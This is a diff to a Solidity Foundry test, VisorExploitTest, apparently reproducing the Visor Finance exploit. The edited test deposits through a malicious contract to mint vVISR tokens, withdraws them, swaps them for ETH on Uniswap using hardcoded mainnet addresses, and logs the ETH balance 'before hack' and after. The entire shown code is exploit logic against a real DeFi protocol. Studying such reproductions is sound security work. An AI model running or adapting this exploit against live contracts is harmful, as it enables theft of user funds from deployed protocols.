@@ -27,16 +27,18 @@ contract VisorExploitTest is Test {
     // anything prefixed with test will start with the
     function testVisor() public {
         // VM cheat code that sets address to 3
-        visor.deposit(10e22, address(visorExploitContract), address(0x7));
+        console.log("ETH BALANCE BEFORE HACK: ", address(0x7).balance);
+        visor.deposit(10e25, address(visorExploitContract), address(0x7));
         console.log("Balance of visor: ", IERC20(visor.vvisr()).balanceOf(address(0x7)));
+        visor.withdraw(10e24, address(0x7), address(0x7));
 
         address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
         address visor_token = address(visor.vvisr());
         address[] memory path = new address[](2);
-        path[0] = visor_token;
+        path[0] = 0xF938424F7210f31dF2Aee3011291b658f872e91e;
         path[1] = weth;
-        IERC20(visor.vvisr()).approve(address(uniswap), 10e26);
-        uint[] memory amounts = uniswap.swapExactTokensForETH(10e16, 1, path, address(0x7), 10e30);
-        // console.log("Amounts :", amounts);
+        IERC20(0xF938424F7210f31dF2Aee3011291b658f872e91e).approve(address(uniswap), 10e26);
+        uint[] memory amounts = uniswap.swapExactTokensForETH(10e22, 0, path, address(0x7), 2650097619);
+        console.log("total eth balance: ", address(0x7).balance);
     }
 }
